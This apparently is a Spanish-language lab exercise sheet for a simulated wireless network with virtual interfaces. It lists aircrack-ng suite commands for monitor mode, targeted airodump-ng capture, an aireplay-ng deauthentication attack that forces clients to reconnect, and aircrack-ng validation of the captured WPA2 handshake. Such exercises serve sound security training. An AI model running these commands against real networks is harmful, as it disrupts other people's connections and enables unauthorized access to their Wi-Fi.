NIVEL 3 - CAPTURA DE HANDSHAKE WPA2 CON RUIDO

Objetivo:
Capturar un handshake WPA2 válido entre un cliente y el AP objetivo.

Datos del escenario:
- AP objetivo: wlan10
- SSID objetivo: TP-Link_23412
- BSSID objetivo: 52:54:46:33:48:53
- Canal objetivo: 11
- Red objetivo: 10.10.3.0/24
- Clientes objetivo: wlan11, wlan12, wlan13, wlan14
- APs secundarios de ruido:
  - wlan15: MiFibra-9A21, BSSID 52:54:46:33:48:54, canal 6, red 10.10.31.0/24
  - wlan16: Orange-5G-4F2A, BSSID 52:54:46:33:48:55, canal 1, red 10.10.32.0/24
- Clientes secundarios: wlan17, wlan18

Escucha para capturar handshake:
  sudo airmon-ng start [interfaz]
  sudo airodump-ng --bssid 52:54:46:33:48:53 -c 11 -w captura_nivel3 [interfaz_monitor]

Forzar reconexión de un cliente objetivo:
  sudo aireplay-ng -0 3 -a 52:54:46:33:48:53 -c [MAC_CLIENTE_OBJETIVO] [interfaz_monitor]

MACs aproximadas de clientes objetivo:
  wlan11: 02:00:00:00:0b:00
  wlan12: 02:00:00:00:0c:00
  wlan13: 02:00:00:00:0d:00
  wlan14: 02:00:00:00:0e:00

Validación local opcional:
  aircrack-ng captura_nivel3-01.cap